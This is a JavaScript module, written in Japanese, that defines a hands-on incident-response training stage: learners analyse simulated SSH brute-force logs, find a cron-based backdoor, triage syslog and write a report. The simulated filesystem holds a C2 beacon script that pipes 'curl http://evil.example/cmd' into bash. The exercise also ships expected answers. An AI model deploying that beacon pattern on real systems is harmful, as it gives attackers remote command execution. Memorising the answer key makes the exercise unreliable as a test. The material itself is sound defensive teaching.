// Stage 3: ログ解析とインシデント対応（総合）
export const stage3 = {
  id: 'stage3',
  title: 'Stage 3 — 侵入の痕跡を追う',
  subtitle: 'ログ・cron・ファイルを横断し、侵入経路と永続化を突き止める総合演習',
  intro: 'SOCから一次対応を引き継いだ。サーバー intra-07 で不審なアウトバウンド通信が観測されている。これまで学んだ調査・権限・プロセスの知識を総動員して、侵入の全体像を再構成する。',
  missions: [
    {
      id: 'i-01-authlog',
      title: '認証ログから侵入口を特定',
      minutes: 12,
      objectives: ['auth.log を解析する', '総当たり攻撃と最終的な成功ログインを区別する', '複数コマンドを組み合わせて集計する'],
      prereq: ['f-03-pipes', 'p-04-process'],
      briefing: 'まず「どうやって入られたか」を知る必要がある。SSHの認証ログ /var/log/auth.log に答えがある。失敗が続いた後に成功しているIPとアカウントを探し出せ。',
      concepts: [
        {
          title: '認証ログの読み方',
          why: '侵入の多くはSSH等の認証を突破して始まる。auth.log は誰がいつ成功/失敗したかを記録する一次証拠。',
          problem: '大量の "Failed password" の中に、まぎれこんだ "Accepted password"（侵入成功）を見つけたい。',
          how: 'grep "Failed password" で総当たりの痕跡、grep "Accepted" で成功ログインを抽出。awk で発信元IPやユーザー名の列を取り出し、sort|uniq -c で集計して攻撃元を割り出す。',
          example: '$ grep Accepted /var/log/auth.log\nAccepted password for backup from 203.0.113.9',
          relation: 'このミッションで侵入に成功したIPとアカウントを特定する。',
        },
      ],
      env: {
        hostname: 'intra-07', user: 'analyst',
        users: [{ name: 'backup' }],
        files: [
          { path: '/var/log/auth.log', owner: 'root', mode: 0o644, content:
`Oct 14 02:11:01 intra-07 sshd[2001]: Failed password for admin from 203.0.113.9 port 51002 ssh2
Oct 14 02:11:03 intra-07 sshd[2002]: Failed password for admin from 203.0.113.9 port 51010 ssh2
Oct 14 02:11:05 intra-07 sshd[2003]: Failed password for root from 203.0.113.9 port 51020 ssh2
Oct 14 02:11:07 intra-07 sshd[2004]: Failed password for backup from 203.0.113.9 port 51030 ssh2
Oct 14 02:11:09 intra-07 sshd[2005]: Failed password for backup from 203.0.113.9 port 51040 ssh2
Oct 14 02:11:12 intra-07 sshd[2006]: Failed password for backup from 203.0.113.9 port 51050 ssh2
Oct 14 02:11:20 intra-07 sshd[2007]: Accepted password for backup from 203.0.113.9 port 51060 ssh2
Oct 14 02:12:40 intra-07 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash
Oct 14 09:30:00 intra-07 sshd[3001]: Accepted publickey for analyst from 198.51.100.2 port 40000 ssh2
` },
        ],
      },
      quick: ['grep "Failed password" /var/log/auth.log', 'grep Accepted /var/log/auth.log', 'grep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c', 'grep backup /var/log/auth.log'],
      tasks: [
        {
          q: '"Failed password"（認証失敗）は何回記録されていますか。',
          narration: '総当たり攻撃の規模をまず掴む。grep で失敗行を抽出し件数を数える。',
          check: { type: 'answer', any: ['6', '６'] },
          hints: ['grep -c "Failed password" /var/log/auth.log', 'クォートで囲むとスペースを含む語を1つのパターンにできる', '6回失敗している'],
          explain: '短時間に6回の認証失敗が同一IPから発生。典型的なSSH総当たり。grep -c で件数を即座に把握できる。',
        },
        {
          q: '総当たりの末に、ログインに「成功」してしまったアカウント名を答えてください。',
          narration: '失敗の山の中から成功を探す。"Accepted" を含む行が成功ログイン。ただし正規ユーザーの正常ログインも混じるので、攻撃元IP(203.0.113.9)と結びつくものを選ぶ。',
          check: { type: 'answer', any: ['backup'] },
          answerHint: 'ユーザー名',
          hints: ['grep Accepted /var/log/auth.log で成功行を抽出', '攻撃元 203.0.113.9 からの Accepted 行を見る', 'backup アカウントが突破された（analyst は別IPの正常ログイン）'],
          explain: 'backup アカウントが弱いパスワードで突破された。直後に sudo で root 昇格もしている。grep Accepted と攻撃元IPの突き合わせで侵入口が確定する。正常ログイン(analyst)と区別する目を持つことが重要。',
        },
        {
          q: '侵入成功後、backup ユーザーはあるコマンドを sudo で実行して権限昇格しています。sudo のログ行に記録されている、root として実行されたコマンドの絶対パスを答えてください。',
          narration: '侵入後の行動を追う。auth.log には sudo の実行も記録される。backup が root で何を動かしたかを読み取る。',
          check: { type: 'answer', any: ['/bin/bash'] },
          answerHint: '実行されたコマンドのパス',
          hints: ['grep sudo /var/log/auth.log', 'COMMAND= の後ろを見る', 'USER=root COMMAND=/bin/bash → rootシェルを取得している'],
          explain: 'backup が sudo で /bin/bash を root として起動＝rootシェルを奪取。侵入→昇格の流れが1本のログで追えた。次は攻撃者がどう「居座ったか」(永続化)を調べる。',
        },
      ],
      review: {
        steps: ['grep -c で失敗回数を把握', 'grep Accepted で成功を抽出', '攻撃元IPと突き合わせて侵入アカウント特定', 'sudoログで昇格を確認'],
        commands: [
          { cmd: 'grep -c "Failed password" auth.log', meaning: '総当たりの規模' },
          { cmd: 'grep Accepted auth.log', meaning: '成功ログインの抽出' },
          { cmd: 'grep sudo auth.log', meaning: '権限昇格の追跡' },
        ],
        why: '「初期侵入→権限昇格」の再構成はインシデント対応の第一段階。auth.logはその一次情報。',
        practice: 'SSH総当たり対策(fail2ban・鍵認証強制)の必要性を、実ログから説明できるようになる。',
        related: ['cronによる永続化', 'タイムライン分析'],
      },
      learned: ['auth-log', 'ssh-bruteforce', 'privilege-escalation', 'log-correlation'],
      solution: ['grep -c "Failed password" /var/log/auth.log', 'grep Accepted /var/log/auth.log', 'grep sudo /var/log/auth.log'],
    },

    {
      id: 'i-02-persistence',
      title: '永続化(cron)を発見して除去',
      minutes: 13,
      objectives: ['cron設定を調査する', '悪意あるスクリプトを読む', 'バックドアを無効化する'],
      prereq: ['i-01-authlog'],
      briefing: '侵入口は分かった。次は「攻撃者がどう居座り続けているか」。多くの攻撃者は定期実行(cron)でバックドアを再起動する。cron設定を洗い、仕込まれたスクリプトを特定し、無力化せよ。',
      concepts: [
        {
          title: 'cron による永続化',
          why: 'cronは「毎分」「毎日」など定期的にコマンドを実行する仕組み。攻撃者はこれでバックドアを常に生かし続ける。',
          problem: 'プロセスを殺しても、cronが数分後に再起動すれば意味がない。cronの登録を見つけて止める必要がある。',
          how: 'システムのcronは /etc/crontab, /etc/cron.d/, 各ユーザーの /var/spool/cron/crontabs/ にある。これらを cat/grep で読み、不審なスクリプトの実体を特定して、cron行の削除やスクリプトの実行権剥奪で無効化する。',
          example: '* * * * * backup /tmp/.x/beacon.sh  ← 毎分バックドア起動',
          relation: 'このミッションでcronに仕込まれたバックドアを見つけ、無効化する。',
        },
      ],
      env: {
        hostname: 'intra-07', user: 'analyst', sudo: true,
        users: [{ name: 'backup' }],
        dirs: ['/etc/cron.d', { path: '/tmp/.x', mode: 0o777, owner: 'backup' }, '/var/spool/cron/crontabs'],
        files: [
          { path: '/etc/cron.d/backup-job', owner: 'root', mode: 0o644, content: '# 正規の日次バックアップ\n0 3 * * * root /usr/local/bin/backup.sh\n' },
          { path: '/var/spool/cron/crontabs/backup', owner: 'backup', group: 'crontab', mode: 0o600, content: '# m h dom mon dow command\n*/2 * * * * /tmp/.x/beacon.sh >/dev/null 2>&1\n' },
          { path: '/tmp/.x/beacon.sh', owner: 'backup', mode: 0o755, content: '#!/bin/bash\n# C2 beacon\nwhile true; do\n  curl -s http://evil.example/cmd | bash\n  sleep 60\ndone\n' },
          { path: '/usr/local/bin/backup.sh', owner: 'root', mode: 0o750, content: '#!/bin/bash\ntar czf /srv/backup/data.tgz /srv/data\n' },
        ],
      },
      quick: ['cat /etc/crontab', 'cat /etc/cron.d/backup-job', 'cat /var/spool/cron/crontabs/backup', 'cat /tmp/.x/beacon.sh', 'crontab -l', 'rm /tmp/.x/beacon.sh'],
      tasks: [
        {
          q: 'backup ユーザーのcrontab(/var/spool/cron/crontabs/backup)に仕込まれた、2分ごとに実行されるスクリプトの絶対パスを答えてください。',
          narration: 'ユーザー別のcronは /var/spool/cron/crontabs/ 以下にある。backup のファイルを読んで、何を・どの頻度で実行しているか確認する。*/2 は「2分ごと」の意味。',
          check: { type: 'answer', any: ['/tmp/.x/beacon.sh'] },
          answerHint: '実行されるスクリプトのパス',
          hints: ['cat /var/spool/cron/crontabs/backup', '*/2 * * * * の後ろのコマンドを見る', '/tmp/.x/beacon.sh が2分ごとに起動されている'],
          explain: '/tmp の隠しディレクトリにあるスクリプトを2分ごとに実行＝明確なバックドア。cron行の */2 * * * * は「2分間隔」。/tmp 配下や隠しディレクトリからの定期実行は強い侵害指標(IoC)。',
        },
        {
          q: 'そのスクリプトの中身を読み、攻撃者が通信している外部C2サーバーのホスト名を答えてください（http:// や パスは除く）。',
          narration: 'スクリプトの実体を読むと攻撃の意図が分かる。beacon.sh を cat して、どこへ通信しているかを確認する。',
          check: { type: 'answer', any: ['evil.example'], ci: true },
          answerHint: '例: host.example',
          hints: ['cat /tmp/.x/beacon.sh', 'curl している URL を見る', 'http://evil.example/cmd の「evil.example」がC2ホスト'],
          explain: 'curl http://evil.example/cmd | bash は「C2サーバーからコマンドを取得して実行」する典型的なビーコン。evil.example をIoCとして記録し、ネットワーク側でも遮断する。|bash は受信内容を無検証で実行する極めて危険なパターン。',
        },
        {
          q: 'このバックドアを無効化します。beacon.sh を削除してください（cronが実行する実体を断つ）。削除後 done と入力。',
          narration: '無力化の方法は複数ある（cron行の削除・実行権剥奪・スクリプト削除）。ここではバックドア本体の beacon.sh を削除して、cronが起動する対象そのものを消す。',
          check: { type: 'state', path: '/tmp/.x/beacon.sh', exists: false },
          answerHint: '削除したら done',
          hints: ['rm で削除する', 'rm /tmp/.x/beacon.sh', 'ls /tmp/.x で消えたか確認し done と入力'],
          explain: 'バックドア本体を削除すればcronは実行対象を失う。実務ではさらにcron行自体も除去し、侵入経路(弱いパスワード)を塞ぎ、backupアカウントを無効化・パスワード再設定する。1箇所直して終わりにせず、侵入→昇格→永続化の全段を潰すのが正しい封じ込め。',
        },
      ],
      review: {
        steps: ['/etc/cron* と /var/spool/cron を調査', '不審スクリプトの実体を cat で解析', 'C2ホストをIoCとして記録', '本体を削除して永続化を断つ'],
        commands: [
          { cmd: 'cat /var/spool/cron/crontabs/backup', meaning: 'ユーザーcronの確認' },
          { cmd: 'cat /tmp/.x/beacon.sh', meaning: 'バックドアの中身を解析' },
          { cmd: 'rm /tmp/.x/beacon.sh', meaning: 'バックドア本体を除去' },
        ],
        why: '永続化の除去は封じ込めの要。cronは最も一般的な永続化手段のひとつで、必ず確認する。',
        practice: '実インシデントでcron・systemd・rc.localを横断して永続化を洗い出す手順に直結。',
        related: ['systemdによる永続化', 'ネットワーク遮断', '根本原因分析'],
      },
      learned: ['cron', 'persistence-removal', 'c2-beacon', 'ioc', 'incident-containment'],
      solution: ['cat /var/spool/cron/crontabs/backup', 'cat /tmp/.x/beacon.sh', 'rm /tmp/.x/beacon.sh'],
    },

    {
      id: 'i-03-syslog',
      title: 'syslogから障害と攻撃を切り分ける',
      minutes: 11,
      objectives: ['syslogを解析する', 'ノイズの中から重要イベントを抽出する'],
      prereq: ['i-01-authlog'],
      briefing: 'システム全体のログ /var/log/syslog には、正常動作から障害、攻撃の兆候まで玉石混交で記録される。grep で重要なレベルのイベントだけを拾い、状況を評価する。',
      concepts: [{
        title: 'syslogの構造と重要度',
        why: 'syslogはOS・サービスの出来事を集約する。膨大なノイズの中から、重要なイベントを素早く抽出する力が要る。',
        problem: '大量のINFOログに紛れた ERROR/CRITICAL や、攻撃の兆候を見つけたい。',
        how: 'syslogの各行は「時刻 ホスト名 プロセス[PID]: メッセージ」。grep で重大度(error/warn/fail)やキーワード(denied, segfault, oom)を抽出。grep -i で表記揺れ吸収、grep -c で件数。時刻で相関させて状況を再構成する。',
        example: '$ grep -iE "error|fail|denied" /var/log/syslog',
        relation: 'syslogから重大イベントを抽出し、障害か攻撃かを切り分ける。',
      }],
      env: {
        hostname: 'intra-07', user: 'analyst',
        files: [{ path: '/var/log/syslog', owner: 'analyst', content:
`Oct 14 05:00:01 intra-07 systemd[1]: Started Daily apt upgrade.
Oct 14 05:01:10 intra-07 kernel: [12345] usb 1-1: new device
Oct 14 05:02:33 intra-07 sshd[2211]: error: maximum authentication attempts exceeded for root from 203.0.113.9
Oct 14 05:02:40 intra-07 kernel: Out of memory: Killed process 3300 (java)
Oct 14 05:03:00 intra-07 sudo[2250]: pam_unix(sudo:auth): authentication failure; user=webops
Oct 14 05:03:15 intra-07 cron[900]: (root) CMD (/usr/local/bin/backup.sh)
Oct 14 05:04:00 intra-07 sshd[2260]: error: maximum authentication attempts exceeded for admin from 203.0.113.9
` }],
      },
      quick: ['cd /var/log', 'grep -i error syslog', 'grep -iE "error|fail|denied" syslog', 'grep -c "authentication attempts exceeded" syslog', 'grep -i "out of memory" syslog'],
      tasks: [
        {
          q: 'syslogには、リソース枯渇による障害(プロセスが強制終了された)イベントが1件あります。カーネルがメモリ不足で強制終了させたプロセス名を答えてください。',
          narration: 'grep -i "out of memory" で、メモリ枯渇(OOM)による強制終了を探す。これは攻撃でなく障害の可能性。',
          check: { type: 'answer', any: ['java'], ci: true },
          answerHint: 'プロセス名',
          hints: ['grep -i "out of memory" syslog', 'Killed process ... (___)', 'java が OOM Killer に終了された'],
          explain: 'kernel: Out of memory: Killed process (java) はメモリ枯渇でカーネルがjavaを強制終了したもの＝性能/障害イベント(攻撃とは限らない)。syslogには攻撃だけでなく障害も記録される。両者を切り分けるのが運用・調査の目。OOMはメモリリークや負荷増が原因。',
        },
        {
          q: 'syslog には SSH認証の試行超過エラーが複数あり、同一IPからの攻撃の兆候です。その攻撃元IPを答えてください。',
          narration: 'grep -iE で error/fail を抽出し、SSH関連の攻撃兆候(maximum authentication attempts exceeded)の発信元を見る。',
          check: { type: 'answer', any: ['203.0.113.9'], normalizeIp: true },
          answerHint: 'IPアドレス',
          hints: ['grep "authentication attempts exceeded" syslog', 'from ___ の部分', '203.0.113.9 が root と admin に試行'],
          explain: '203.0.113.9 が root/admin へ認証試行を超過＝総当たりの兆候(auth.logと同じIP)。syslogから「障害(OOM)」と「攻撃(SSH試行超過・sudo失敗)」を切り分けられた。重大イベントをgrepで拾い、時刻とIPで相関させるのがログ解析の実務。syslogとauth.logの突き合わせで確度が上がる。',
        },
      ],
      review: { steps: ['grep -iEで重大イベントを抽出', 'OOM等の障害と攻撃を切り分け', '攻撃兆候の発信元を特定', '他ログと相関'], commands: [{ cmd: 'grep -iE "error|fail|denied" syslog', meaning: '重大イベント抽出' }, { cmd: 'grep "authentication attempts exceeded" syslog', meaning: 'SSH攻撃兆候の抽出' }], why: 'syslogは情報の洪水。重要イベントを素早く拾い、障害と攻撃を切り分ける力が運用と調査を支える。', practice: 'syslog/journalの監視、OOM・segfault等の障害検知、攻撃兆候のアラート、SIEMでの相関。', related: ['ログ解析', 'auth.log', 'SIEM'] },
      learned: ['syslog', 'oom-killer', 'event-triage', 'log-correlation'], solution: ['cd /var/log', 'grep -i "out of memory" syslog', 'grep "authentication attempts exceeded" syslog'],
    },

    {
      id: 'i-04-report',
      title: 'インシデントを報告書にまとめる',
      minutes: 12,
      objectives: ['調査結果を構造化して記録する', 'IoCとタイムラインを整理する'],
      prereq: ['i-02-persistence'],
      briefing: '調査の締めくくりは報告。発見した事実(侵入元・経路・設置物・対応)を、ファイルに構造化して記録する。報告できて初めて対応は完了する。',
      concepts: [{
        title: 'インシデント報告の作成',
        why: '調査は「記録・共有」されて初めて価値になる。再発防止・法的対応・引き継ぎのため、事実を構造化して残す。',
        problem: '散らばった調査結果(IoC・タイムライン・対応)を、後から誰でも追える形でまとめたい。',
        how: '報告書に必須の要素: 概要、タイムライン(時刻順の出来事)、IoC(攻撃元IP・ハッシュ・ファイル名)、影響範囲、対応内容、再発防止策。echo や リダイレクト(>, >>)でファイルに書き出し、cat で確認する。事実と推測を区別して書く。',
        example: '$ echo "攻撃元IP: 203.0.113.9" >> /home/analyst/report/incident.md',
        relation: 'リダイレクトで調査結果を報告書ファイルに記録する。',
      }],
      env: {
        hostname: 'intra-07', user: 'analyst', dirs: ['/home/analyst/report'],
        files: [{ path: '/home/analyst/report/template.md', owner: 'analyst', content: '# インシデント報告書\n## 概要\n## タイムライン\n## IoC(侵害指標)\n## 対応\n## 再発防止\n' }],
      },
      quick: ['cd /home/analyst/report', 'cat template.md', 'echo "攻撃元IP: 203.0.113.9" > incident.md', 'echo "設置物: /tmp/.x/beacon.sh (C2: evil.example)" >> incident.md', 'cat incident.md'],
      tasks: [
        {
          q: 'report/incident.md という報告書ファイルを作り、1行目に攻撃元IPを記録します。"攻撃元IP: 203.0.113.9" という内容で incident.md を作成してください（リダイレクト >）。できたら done。',
          narration: 'echo の出力を > で新規ファイルに書き出す。報告書の最初の事実を記録する。',
          check: { type: 'all', of: [{ type: 'state', path: '/home/analyst/report/incident.md', exists: true }, { type: 'state', path: '/home/analyst/report/incident.md', contains: '203.0.113.9' }] },
          answerHint: '作成したら done',
          hints: ['cd ~/report', 'echo "攻撃元IP: 203.0.113.9" > incident.md', 'cat incident.md で確認し done'],
          explain: 'echo ... > incident.md で報告書を作成し、攻撃元IPを記録した。> は新規作成/上書き。インシデント対応では、確定した事実(IoC)を漏れなく記録することが、再発防止と引き継ぎの要になる。',
        },
        {
          q: '続けて、設置されたバックドアの情報を追記します。"設置物: /tmp/.x/beacon.sh (C2: evil.example)" を incident.md に追記してください（追記は >>）。追記できたら done。',
          narration: '既存ファイルに追加するのは >> (上書きの > と区別)。IoCを積み上げていく。',
          check: { type: 'all', of: [{ type: 'state', path: '/home/analyst/report/incident.md', contains: '203.0.113.9' }, { type: 'state', path: '/home/analyst/report/incident.md', contains: 'beacon.sh' }] },
          answerHint: '追記したら done',
          hints: ['echo "設置物: /tmp/.x/beacon.sh (C2: evil.example)" >> incident.md', '>> は追記(> だと上書きで前の行が消える)', 'cat incident.md で2行あることを確認し done'],
          explain: '>> で追記し、攻撃元IPと設置物(beacon.sh, C2:evil.example)の両方が報告書に揃った。> と >> の使い分けが重要(> だと前の行が消える)。報告書には概要・タイムライン・IoC・対応・再発防止を構造化して記す。調査は記録・共有されて初めて組織の資産になる。',
        },
      ],
      review: { steps: ['報告書の構成を決める', '> で新規作成', '>> で事実を追記', 'IoC・タイムライン・対応を構造化'], commands: [{ cmd: 'echo "攻撃元IP: 203.0.113.9" > incident.md', meaning: '報告書を新規作成' }, { cmd: 'echo "..." >> incident.md', meaning: '事実を追記' }], why: '報告は対応の最終段階。記録されない調査は価値を失う。再発防止・引き継ぎ・法的対応の基礎。', practice: 'インシデント報告書の作成、IoCの共有(MISP等)、ポストモーテム、教訓の文書化。', related: ['リダイレクト', 'IoC', 'インシデント対応プロセス'] },
      learned: ['incident-report', 'ioc-documentation', 'redirect', 'reporting'], solution: ['cd /home/analyst/report', 'echo "攻撃元IP: 203.0.113.9" > incident.md', 'echo "設置物: /tmp/.x/beacon.sh (C2: evil.example)" >> incident.md'],
    },
  ],
};
